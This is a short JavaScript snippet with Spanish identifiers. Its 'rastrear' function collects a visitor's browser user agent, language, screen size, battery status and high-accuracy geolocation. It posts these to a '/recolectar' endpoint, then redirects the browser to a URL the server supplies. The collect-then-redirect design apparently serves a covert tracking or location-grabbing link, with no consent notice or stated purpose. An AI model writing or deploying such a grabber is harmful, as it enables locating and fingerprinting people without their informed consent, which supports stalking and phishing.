async function rastrear() {
  let data = {
    user_agent: navigator.userAgent,
    idioma: navigator.language,
    pantalla: {
      ancho: screen.width,
      alto: screen.height
    }
  };

  if (navigator.getBattery) {
    try {
      const battery = await navigator.getBattery();
      data.bateria = {
        nivel: battery.level,
        cargando: battery.charging
      };
    } catch {}
  }

  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(async pos => {
      data.ubicacion = {
        latitud: pos.coords.latitude,
        longitud: pos.coords.longitude,
        precision: pos.coords.accuracy
      };
      await enviar(data);
    }, async err => {
      data.ubicacion = { error: err.message };
      await enviar(data);
    }, { enableHighAccuracy: true });
  } else {
    data.ubicacion = { error: "No soportado" };
    await enviar(data);
  }
}

async function enviar(data) {
  const res = await fetch('/recolectar', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(data)
  });
  const r = await res.json();
  if (r.redirigir_a) {
    window.location.href = r.redirigir_a;
  }
}
